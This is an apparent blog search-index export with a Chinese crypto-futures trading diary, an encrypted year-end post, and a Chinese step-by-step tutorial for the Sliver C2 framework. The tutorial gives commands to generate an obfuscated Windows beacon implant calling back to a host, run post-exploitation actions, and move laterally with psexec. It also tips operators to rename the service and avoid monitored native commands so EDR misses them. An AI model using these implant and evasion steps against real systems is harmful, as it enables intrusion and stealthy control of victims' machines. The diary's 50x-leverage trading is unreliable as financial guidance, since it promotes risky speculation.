<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>数字货币悟道记</title>
    <link href="/2024/01/02/blockchainmaster.html"/>
    <url>/2024/01/02/blockchainmaster.html</url>
    
    <content type="html"><![CDATA[<h1 id="数字货币悟道记"><a href="#数字货币悟道记" class="headerlink" title="数字货币悟道记"></a>数字货币悟道记</h1><p>随时更新，随时销户 :(</p><h2 id="交易教训"><a href="#交易教训" class="headerlink" title="交易教训"></a>交易教训</h2><ul><li>技术指标没有确认就入场，而且不认亏走人，止损上移。</li><li>FOMO？！X</li><li>急着回本？没有必要，市场的机会非常多。<h2 id="史记"><a href="#史记" class="headerlink" title="史记"></a>史记</h2><blockquote><p>很幸运也很高兴，您能看到我的随记。本篇记录起始于20231205. 很久以前没什么概念要记录这些东西，当时纯粹是玩耍心态，刚好这段时间都在说BTC牛市马上启动，好！那我也准备用1W（2000一笔，分5次，这样还有重新再来的机会），重新来试一试。</p></blockquote><h4 id="20231229-02"><a href="#20231229-02" class="headerlink" title="20231229-02"></a>20231229-02</h4><blockquote><p>前段时间在出差，没时间看。正好工作闲暇时间看一下相关的技术分析文章，主要还是管住心性，不要着急，急=给其他人送钱。</p></blockquote><figure class="highlight subunit"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs subunit">29战果：<span class="hljs-string">-10</span>.2 <span class="hljs-string">+1</span>.45 <span class="hljs-string">+17</span>.1 工作完成，偶尔在路上开了几单，效果不好。<br>30战果：<span class="hljs-string">+48</span> <span class="hljs-string">-17</span> <span class="hljs-string">+111</span> <span class="hljs-string">+11</span> <span class="hljs-string">-3</span>.3 <br>31战果：<span class="hljs-string">-11</span>.6 <span class="hljs-string">+5</span>.3 <span class="hljs-string">+33</span>.5<br>01战果：<span class="hljs-string">+0</span>.77 <span class="hljs-string">-15</span> <span class="hljs-string">-4</span> <span class="hljs-string">+7</span> <span class="hljs-string">+143</span> <span class="hljs-string">-2</span>.78 <span class="hljs-string">-6</span>.6 <span class="hljs-string">-3</span>.7 <span class="hljs-string">+74</span> <span class="hljs-string">-15</span>.9 今天还好，都是正常止损，因为自己的杠杆50X相当高，小止损多尝试，总能抓住一波行情，一波大行情就赚回来了。<br>02战果：<span class="hljs-string">+103</span> <span class="hljs-string">-20</span> <span class="hljs-string">+4</span>.7 <span class="hljs-string">-30</span> <span class="hljs-string">-27</span> <span class="hljs-string">+102</span><br>今天<span class="hljs-string">-30</span> <span class="hljs-string">-27</span>这两单不好，自己怕错过做空的机会，因为来到了历史高点，一直在尝试找顶，硬生生的从浮盈<span class="hljs-string">+80</span>到浮亏<span class="hljs-string">-30</span>，正常止损了，但是入场点十分不好。当时价格变化非常的快，很难冷静下来。以后还得修心啊，唉。<br></code></pre></td></tr></table></figure><h4 id="20231217-20"><a href="#20231217-20" class="headerlink" title="20231217-20"></a>20231217-20</h4><blockquote><p>第二波的2000就得慎重了。这时候我发现布林带策略，恰好符合1000SATS的图形，突破不会超过上轨、下轨太多，配合KDJ，发现KDJ交叉的地方大概率是转折点。按照这个交易法，配合50X杠杆，加小止损。最终战果：-16.5 +39 -49.7 -8.56 -12 -5.22 +19 +14 +91 +5 -105 +1.84 -15.12 -11.8 +62 -11.7 -21.4 +85 -15 -17 -15 -12 +19 -16.8 </p></blockquote><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">主要的几笔：<br><span class="hljs-string">-105</span> 是技术指标没有确认就入场，而且不认亏走人，止损上移，而且是逆势做单。<br><span class="hljs-string">-15</span>.12 <span class="hljs-string">-11</span>.8 自己应该要有纪律性，赔钱原因是K线指标还没确认就开单。<br><span class="hljs-string">+85</span> 虽然盈利，但是因为太怕亏损了，把止损线逐渐上移保本太过于奔放，导致小震荡突破我设置的止损线，直接止损，后期看，直接损失120U。这个应该不是大问题，毕竟是盈利，只不过以后呢需要自己挪动止盈止损线的时候小心一些。有些时候也没办法，因为咱们是50X的杠杆，风险比较高。以后U多起来之后，绝对不用20X以上杠杆了，稍微大的波动就很容易爆仓，不过我一般都是75%的仓位，保证金在有了收益之后逐渐在增加，风险逐渐变小了。<br><span class="hljs-string">-16</span>.8 这个只能自己说一句“我是傻逼”了，完全凭感觉开了一单。<br></code></pre></td></tr></table></figure><h4 id="20231216"><a href="#20231216" class="headerlink" title="20231216"></a>20231216</h4><blockquote><p>亏的有点多，子弹没有了，不敢上了，自己又学习了一些不知道以后有没有用的东西。第二波2000块投进去。然后自己不敢操作，恰好看见币安软件上有跟单交易功能，选了一个API交易的，最后战果：+1 -1 +2 -5 +1.5 +1.5 -0.07 +1.99 +7 +0.29 -5.96 +1.2 -12 -4 +4 +8 -5.7 +1.78 +5.3 -16.13 +0.02 +5.25 -0.82 +0.35 +0.22 +15 -17.27 +0.66 -1.14 -3.27 -0.4 -16 +39 -49.7 -8.56 -12.1 -5.22 +19 +14 等等<br>反正最后就是赚了，但是一看收益 +3U。后来就自己操作了，赎回了。</p></blockquote><h4 id="20231206"><a href="#20231206" class="headerlink" title="20231206"></a>20231206</h4><blockquote><p>5号小试了一下，很难受，5X杠杆，虽然风险相对较低，但是收益很难看，我觉得前期还得是小资金博大收益为好。所以不如加杠杆试一下，主要是推特上有人的收益截图，普遍都是10X，20X，我这个5X的就不太够看了。</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">004642</span> ORDI*<span class="hljs-number">8.4，59/63</span>.<span class="hljs-number">86</span> +<span class="hljs-number">41</span>U.<br>之前学过一些东西，这一阶段主要是直接看K线和成交量，写这些字的时候回想起来真的是一言难尽。<br><span class="hljs-number">131734</span> ORDI*<span class="hljs-number">15.2 60/56</span>.<span class="hljs-number">222</span> -<span class="hljs-number">57</span>.<span class="hljs-number">4</span>U.<br>很快，这种判断方式可参考的因素太少了，很容易出错。而且当时的止盈止损不固定，经常自己改。不能参考<br><span class="hljs-number">132712</span> ORDI*<span class="hljs-number">8.3 57/53</span> -<span class="hljs-number">36</span>.<span class="hljs-number">6</span>U<br>上头了，觉得自己如果再开个仓，一定能把亏的赚回来。结果。。。可想而知。管理情绪自己做的还不合格还需要修炼<br><span class="hljs-number">134452</span> ORDI*<span class="hljs-number">3.9 53/53</span>.<span class="hljs-number">7</span> +<span class="hljs-number">2</span>.<span class="hljs-number">75</span>U<br>没钱了，可以用的子弹越来越少了，这时候情绪更不稳定了。<br><span class="hljs-number">180728</span> BAKE*<span class="hljs-number">1504</span> <span class="hljs-number">0.2954/0</span>.<span class="hljs-number">2785</span> -<span class="hljs-number">25</span>.<span class="hljs-number">4</span>U<br>看了tw上的推文，觉得跟着kol买试试看？其实人家推的是现货，我觉得没有合约杠杆高，想着来合约试一下，然后人家现货没有爆仓什么的，我这里有，亏的有点多，就撤掉了。<br></code></pre></td></tr></table></figure><h4 id="20231205"><a href="#20231205" class="headerlink" title="20231205"></a>20231205</h4>现在的我知道交易真的是一门学问，我主要认为交易都是人性的弱点的体现，想要在市场中胜出，必须要了解交易心理，得跟自己的人性反着来，顺着其他人的人性预测市场的走向，配合合适的技术指标帮助更加理性的分析。所以在准备交易之前，我学习了一些ytb课程，什么技术分析，支撑、突破结构等等，蜡烛图，还在b站看了什么熊猫玩币的课程，感觉有一些收获。<blockquote><p>几年之前也基础过各种加密货币交易所，但是当时真的是什么都不懂，只知道凭感觉来看这个是涨还是跌，完全没有章法。亏过了很多，现在还记得当时的感觉，看着自己的浮动收益红彤彤的，在心里呐喊给我涨（或者跌），哈哈，很幼稚很天真。现在看来，其实这种交易，那些高手赚的就是我们这种小白的钱，赚的就是我们这种情绪漏洞上面的钱，没有我们就没有他们的收益。</p></blockquote></li></ul><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">分仓，合约100U，现货170U。<br>143342 ORDI*10.2 49.4/49.72 <span class="hljs-string">+3</span>.3U.<br>合约买了10.2个ORDI铭文龙头，5X杠杆，，哈哈，<span class="hljs-string">+3</span>.3U。没什么意思，100U进来，就赚了3U？<br>234300 ORDI*8.8 56.53/55.69 <span class="hljs-string">+7</span>.3U.<br>没忍住，又买了8.8个ORDI 56.53/55.69 有进步呵呵（自我嘲笑） <span class="hljs-string">+7</span>.3U。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链</tag>
      
      <tag>币安</tag>
      
      <tag>比特币</tag>
      
      <tag>数字货币</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sliver从入门到入土</title>
    <link href="/2023/02/10/sliver_c2.html"/>
    <url>/2023/02/10/sliver_c2.html</url>
    
    <content type="html"><![CDATA[<p>笔者最近在使用sliver过程中，发现目前中文社区内暂无较为完善的教程。</p><p>而且目前命令搜索相当麻烦，因此整理出一份入土教程供大家参考</p><p>当然了，同时也会作为本人备忘录使用。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>一键脚本</p> <figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">curl -q -o- https://sliver.sh/install | sudo bash<br></code></pre></td></tr></table></figure></li><li><p>自行下载</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">    直接从https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BishopFox/</span>sliver/releases下载，<br>    服务端下载-server，例如wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BishopFox/</span>sliver<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v1.5.34/</span>sliver-server_linux<br>    客户端用的上就下载,是-client<br><br>​需要注意最好机器上安装msf，如果需要stage的话，msf是必须的。<br>​    ```<br><br><span class="hljs-comment">## 使用</span><br><br><span class="hljs-comment">### 协同工作</span><br><br>**服务端**<br><br>需要注意的是，server端默认监听的端口为<span class="hljs-number">31337</span>。创建用户配置文件尽量不要用默认的。<br><br>```sh<br><span class="hljs-comment">#创建用户配置文件</span><br>new-operator --name Jesen --lport <span class="hljs-number">20000</span> --lhost <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><br><span class="hljs-comment">#启用多用户</span><br>multiplayer -l <span class="hljs-number">20000</span><br></code></pre></td></tr></table></figure></li></ol><p><strong>客户端</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#配置文件放入位置</span><br>windows=C:\Users\xxx\.sliver-client\configs\<br>linux=~/.sliver-client/configs/<br><br><span class="hljs-comment"># 放入之后，如果只有一个配置文件，那么直接运行client即可，否则需要import</span><br><br>./sliver-client_linux import /root/tool/Jesen_1.1.1.1.cfg<br></code></pre></td></tr></table></figure><h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>支持mtls http https dns wg</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#监听本机23333端口</span><br>mtls -l 23333<br></code></pre></td></tr></table></figure><p>其他协议同理，不会就-h</p><h3 id="生成木马（Implants）"><a href="#生成木马（Implants）" class="headerlink" title="生成木马（Implants）"></a>生成木马（Implants）</h3><p>​    b站上面有个教程很粗糙（<del>没错，就是写着最细的那个</del>），误人子弟。他没有说明beacon和session的区别，跟着他走是生成session，会有一些局限性。在最新版本中，如果生成的beacon，通过interactive命令即可很快的转成session，反之，不好意思官方没有实现。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">首先要记住，遇事不决-h / <span class="hljs-built_in">help</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">例如generate -h</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成beacon,采用mtls回连1.1.1.1的23333端口,如无特殊说明，演示机IP均会打码成1.1.1.1</span><br>generate beacon --arch amd64 --os windows --mtls 1.1.1.1:23333 --save .<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">时间会有点长，因为要混淆，大概输出结果如下</span><br>[*] Generating new windows/amd64 beacon implant binary (1m0s)<br>[*] Symbol obfuscation is enabled<br>[*] Build completed in 00:01:05<br>[*] Implant saved to /xxx/DIFFICULT_DYNAMO.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">重新用同样配置生成新的</span><br>regenerate<br></code></pre></td></tr></table></figure><h3 id="开始干活"><a href="#开始干活" class="headerlink" title="开始干活"></a>开始干活</h3><p>上线会有提示，用<code>beacons</code>命令可以看到：</p><p><img src="/2023/02/10/sliver_c2/image-20230210230859968.png" alt="image-20230210230859968"></p><p>输入use，选择对应的beacon。</p><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#用户名</span><br><span class="hljs-built_in">whoami</span><br><span class="hljs-comment">#ip</span><br>ifconfig<br><span class="hljs-comment">#当前目录</span><br><span class="hljs-built_in">pwd</span><br><span class="hljs-comment">#查看文件内容</span><br><span class="hljs-built_in">cat</span> [path]<br><span class="hljs-comment">#切换目录</span><br><span class="hljs-built_in">cd</span> [location]<br><span class="hljs-comment">#列目录</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-comment">#高级操作</span><br>execute-assembly<br>execute-assembly (inline with --in-process)<br><br><span class="hljs-comment">#进程操作</span><br>ps [-c/--print-cmdline]<br>-c代表显示命令行参数？<br>terminate [pid]<br>procdump -p [pid]<br>migrate [pid] (Windows Only)<br><span class="hljs-comment">#上传下载</span><br>upload [<span class="hljs-built_in">local</span> src] &lt;remote dst&gt;<br>download remote-path [local-path/.]<br><span class="hljs-comment">#获取gid pid uid</span><br>getgid<br>getpid<br>getuid<br><span class="hljs-comment">#关闭interactive session，不关闭进程</span><br>close<br><span class="hljs-comment">#beacon转换session（需要等待beacon回连周期）（无法显示看出来，只能看颜色，红色session蓝色beacon）</span><br>interactive<br><span class="hljs-comment">#文件操作</span><br><span class="hljs-built_in">mv</span><br>rename<br><span class="hljs-built_in">rm</span><br><span class="hljs-built_in">mkdir</span><br><span class="hljs-comment">#网络</span><br>netstat<br><span class="hljs-comment">#链接远程ssh</span><br>ssh -l root -P root123 192.168.0.100 <span class="hljs-built_in">ls</span><br><span class="hljs-comment">#关闭session（根据Implants名字或者session id）</span><br><span class="hljs-built_in">kill</span><br><span class="hljs-comment">#session信息</span><br>info<br>ping(session存活否？)<br><span class="hljs-comment">#截图</span><br>screenshot<br><br><br><br><span class="hljs-comment">#其他的就自己看翻译吧</span><br>  execute            Execute a program on the remote system<br>  execute-shellcode  Executes the given shellcode <span class="hljs-keyword">in</span> the sliver process<br>  extensions         Manage extensions<br>  msf                Execute an MSF payload <span class="hljs-keyword">in</span> the current process<br>  msf-inject         Inject an MSF payload into a process<br>  pivots             List pivots <span class="hljs-keyword">for</span> active session<br>  portfwd            In-band TCP port forwarding<br>  reconfig           Reconfigure the active beacon/session <br>  rportfwd           reverse port forwardings<br>  shell              Start an interactive shell<br>  shikata-ga-nai     Polymorphic binary shellcode encoder（shellcode编码器，msf）<br>  sideload           Load and execute a shared object (DLL) <span class="hljs-keyword">in</span> a remote process<br>  socks5             In-band SOCKS5 Proxy<br></code></pre></td></tr></table></figure><h4 id="代理、端口相关"><a href="#代理、端口相关" class="headerlink" title="代理、端口相关"></a>代理、端口相关</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#socks5开启</span><br>Start an in-band SOCKS5 proxy<br>Usage:<br>======<br>  start [flags]<br>Flags:<br>======<br>  -h, --<span class="hljs-built_in">help</span>           display <span class="hljs-built_in">help</span><br>  -H, --host string    Bind a Socks5 Host (default: 127.0.0.1)<br>  -P, --port string    Bind a Socks5 Port (default: 1081)<br>  -u, --user string    socks5 auth username (will generate random password)<br><span class="hljs-comment">#socks5关闭</span><br>socks5 stop -i [ID从1开始]<br><br><span class="hljs-comment">#端口转发开启</span><br>portfwd add -b 127.0.0.1:13389 -r 192.168.0.100:3389<br>portfwd <span class="hljs-built_in">rm</span> -i [ID从1开始]<br>rportfwd 转发本地端口到远程，命令类似。<br><br></code></pre></td></tr></table></figure><h4 id="域相关"><a href="#域相关" class="headerlink" title="域相关"></a>域相关</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">getsystem<br>psexec<br><span class="hljs-comment">#需要先创建profiles</span><br>profiles new --format service --skip-symbols --mtls 1.1.1.1:23333 win-svc64<br><span class="hljs-comment">#创建完才能psexec，记得改名字和描述，不然会显示sliver，一看就看出来</span><br>psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/sliver_c2/FzKX4_Sliver%20C2%20Implant-16377473396871.png" alt="Sliver C2 Implant"></p><h4 id="扩展能力"><a href="#扩展能力" class="headerlink" title="扩展能力"></a>扩展能力</h4><p>首先要更新索引</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">sliver &gt; armory<br><br>[*] Fetching 1 armory index(es) ... <span class="hljs-keyword">done</span>!<br>[*] Fetching package information ... <span class="hljs-keyword">done</span>!<br>[...trim...]<br></code></pre></td></tr></table></figure><p>安装官方的工具，无需安装coffloader。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">armory install rubeus<br>armory install seatbelt<br>armory install nanodump<br></code></pre></td></tr></table></figure><p>安装非官方工具，需要安装<a href="https://github.com/sliverarmory/COFFLoader">COFF Loader</a> extension</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#参考链接1： cna转sliver格式</span><br>https://github.com/BishopFox/sliver/wiki/BOF-&amp;-COFF-Support<span class="hljs-comment">#converting-bofs-to-sliver</span><br></code></pre></td></tr></table></figure><p>安装工具的使用：<br>需要注意如果给扩展传参数，前面需要加—表示sliver自己的参数已经给完了，—之后的全是seatbelt的参数了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">seatbelt -i -- -group=system<br></code></pre></td></tr></table></figure><h4 id="额外注意"><a href="#额外注意" class="headerlink" title="额外注意"></a>额外注意</h4><ol><li>shell命令会导致日志的生成，而且目前没有实现参数混淆，会导致edr发现你的敏感操作。</li></ol><p><img src="/2023/02/10/sliver_c2/Pasted%20image%2020220926232548.png" alt="event log view"></p><ol start="2"><li><p>少在cmd/ps中使用whoami,hostname,systeminfo等命令，转而使用框架自带命令，因为那些原生命令处于监控之中。</p></li><li><p>文档写于20230210，如有遗漏请留言补充，我会同步更新到文章中。</p></li><li><p>随着时间流逝本篇文章不可避免会过时，目前最新sliver版本如下：</p> <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[*]</span> Client v1<span class="hljs-number">.5</span><span class="hljs-number">.34</span> - windows/amd64<br><span class="hljs-string">[*]</span> Server v1<span class="hljs-number">.5</span><span class="hljs-number">.34</span> - linux/amd64<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>远控C2</category>
      
      <category>教程</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>远控</tag>
      
      <tag>sliver</tag>
      
      <tag>入门教程</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022年度总结</title>
    <link href="/2023/01/01/2022zongjie.html"/>
    <url>/2023/01/01/2022zongjie.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3e8104bae27cd22c405e5f11e3c9a3e2a36baca95f3edb6874444570110027f7">8860839fd3ea121e434cd53b262b1410efc429353b12582a0dfd2e2e9b7cb8da70e0f504519b14425511bd067dfbbfc6bdda78fc1980e144e4d442d4aecbb50febe69db87984b94f88340def5a36f194d16c66c3cc39239b344aca2064db029ba72c9d284d91ec718fb6b897b438cce57c9dfb8f3fb8326b7ee3950468dbaac057c56149eff6ba6917731088f892ffaaf19714fd3bfb83294ef76eb98f428642b204754ea68f9798ee92204bef96bb07cdae35bef5b6cdd30592f8bbb9865668b26581389405206369cd03a721e578c7e03f77068daa2a22e2fe4ae713529f546074bf72eb7c7c098d85f495ad05862b128f744ef37e9a3ae147e8820ce907c1f55f82e22e8fae50ee425dee1afb24a7702c97d463371acc8b350d834526d1aee57d8a6f92522c32833780003ac69a39ea5b009ca2625d39d693543ab140d5486ea8d4092ccb9c50e09e6517c036f22861c025be0d5de805e80eac66754cf92f381c499770f7a84ee3e703d42523513df84ec008d3e6f127e5390be150a5ca6165e6ffdd0e9e5aea3a67b19acc8e30ad83e1cce7cda32863627e1a3b647fcd7762334bfa7c2ee3a61ce1b84d2c5ba9fbd1eb09e4e1a0985cef05e51f5b1855e1bfbb3a991ba038f31025eaa7f8a79254997a5fa53f049ff92800435a434bffed6f4435a2ba04c697cdaf04f6b0c10276be3f69889742c5bd47fcf105984d6b9b87b6a07dab07bfc0c4564e62e0883cf8ff54094dffd155e5db94de31a698cbd5e1ef08360de4edd10c8b1141c2b3572ffd285cedc0b9e3b9eccd75fe957c59f08fc0920f348d9842e383cd533d65f09c75bac150193c15094e449a2d9dca38bfca197eba064af080540dbb90ce3a9311e05ffb71ecd4cbdc29b3c86df81d2c5d83080b8b38c413f764ca9d911a468c1b14a124d6579158f6f0ed81d7e2e119dab52e4c5652b796f19647512638ae5444141a5132bbf8d3a20a1bff16fee76245ca52e56e1daab4a05469c69bdf06692218f65a594787c5a7195b29b56bdb494b8799ca6d7d622ba35ddca196baa6f725e4aeac7b915e222b9981755f451860585dfd84346d113132493126043bb4c9763b59be1f62a2d3062897f361945e0de6be78451b8c1b30f59c6b7dcd4226d77f41865073fd83203aa53bedea884eca4a6ce96ca61590ac2bc6776eb02209bb33d6ca1dc82851906769d95f85c18aeed6b6ca8d6e2ab8936a6b40ba7b33d766cf484ae220029d2cb70755fd99ba29888b27d6afb5217c20e7b48e4ebf90b4772bc8d1c37b1ce28b566bbc8c53911423ac5669a7e04eb24d47b0966cb1c83df8627a70f941a975dcc299fb17fc3c698a9d77e54907a3e0511d9361606934204b85eeab21ab1bcdd25b82a902a29db5f48464bb09dfa26848f0428dc389be1a1dc1dafb8d0849b4f534d953678accc1afee3170a0a8837a465d814636846697398a80fe89db97f2347f4523e4214ba8586257bd1227654106f8f7ec729c5c90f7f623430c9459a3f2d8d88bff92acf421ed1b079cc8089e5434ee10abf071f4a77d370925c6b3cc5a59320a604249dc1ac18d0970997c4a76829c5f9af01e66292659e7e75fe2413c48a1bcd025af36c296193cb5bccfeb1c66f2b7790b452b3541fa5db5aaa8e247347e0df48689919bed339ed0399d190218850e871c14bd3428a1eb15eae7aed4f6db8442a66bc04bd747218d4fd96b124c4bd40ec6819bf4f7dd45868c4b101090a30db2d36e71a7e87d57b0b7d5bcb061f1c7c1838721210fb02d57bb46cfc4ce34608b67e4e1c067e8cb415673bd8f5ca0ea2d037801c4173950afb79c724b6d9ee0cb432fd4b66f54e276f4515f962e656230622fa471a154e19a5a640eacc1eac6e4bc576fa84eb7a06488be2bb028d5bd3789a1129eb89b84f0b07b814b4108f452200698c4cb39a656f566a47846e8bf6d2320c9703fc0ef6d8fa29d92caebd12a2a36b9b077820e5283e60084aaee37d1b976ef022e5a50de8c47152f20566d0550058417dba099dc19c3b16b0949917e74aa59a9bacaf98b558fad25e1b2e63b187bcff52b008ac59ea5bdd7258bb2e8dd33c53bd17a1c3a81d6d42e646b42f0e4865110a1b416d438749d5b3220379670e3662ec96e42ea89835e07c8692c1a47d274c702197d438ce3bcc98889e67ee476382289a1b427c16a52bc52aa5121be6eb2470a03aa1149320d8335fc1babcf50ea45287005f4a7d7215c40b36a42ab3fea1ea40cc67d0f7ea855437e4ed96c16dff2bdcb9950854500e91d77e8e9887ab31816e5cabc9343a80128a5039a5bd2ba0e37903deb13da119d49a229affe32390b95533067d2af4de0f6cf1d5c59e82566ff00076ef9fc9010eb78740332ab6b75986a2d2db37a2078f6afb8636dc407be7593b1736f896ea2d50579f87ef01b012aac2849257bf61b3b5079d96e93560c17466ce99115846cec3df06202120a3e11d571313f239c2d0b70313577dfb9bd2b940ea86e277ca00465a6292d0b0dd49770ea7b6b92c838c4caea04e8ef1072439285f871c37132127735449647f8cd151efda179d5137ad38e133bf1263dd74548182fe4d0df15e7d812e525a631cde0c0e178d2501b911b16dab8b9b422bc0f26e726eccc19eefbcc2431226dc8bdbea1d64911e6ff3b8679a52e60b1e13cafb751b01f9b1ac1018148b9a2a372634f567b40909aae7c9f9c360f191456622b62c422eaf5e0ecc5306946f8b1a41d8239a4b67fddb6aa1b9923b705021984481db7441b54d362dc98f0e7798d75a9effa85cb157b2fe4f9af24d8e68969559f2568ffc57c7f54b99131a344e074496b08ab9aead43060a8000bd3f9d40463912636031eb9fb0c7021c93ef9d40dc723707b1ff791ae0711d30fd1cbb87eca3e3808c0ff630f2aada4a5db29b8943dcd9e1961ba64385ccf850dc5be36852283e183bbdaaefebfc5d9f8e969335e26ec6c86d14c197968fb143b301f130fba0e45d26178db89950d7ad8e691ff80ba0388ac9653025813b8f5e61cc561289e78288